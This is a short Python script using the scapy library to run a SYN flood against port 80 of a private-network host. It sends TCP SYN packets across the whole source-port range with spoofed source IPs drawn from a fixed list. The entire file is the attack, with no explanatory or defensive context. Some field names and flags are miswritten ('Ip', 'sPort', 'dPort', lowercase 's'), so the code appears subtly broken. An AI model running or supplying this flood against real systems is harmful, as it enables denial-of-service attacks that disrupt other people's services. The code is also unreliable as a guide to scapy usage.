import random
import time
from scapy.all import *
tgt='192.168.48.129'
print(tgt)
dPort=80
def synFlood(tgt,dPort):
    srclist=['11.1.1.2','22.1.1.102','33.1.1.2',
             '44.1.1.2']
    for sPort in range(1024,65535):
        index=random.randrange(4)
        ipLayer=Ip(src=srclist[index],dst=tgt)
        tcpLayer=TCP(sPort=sPort,dPort=dPort,flags='s')
        packet=ipLayer/tcpLayer
        send(packet)
synFlood(tgt,dPort)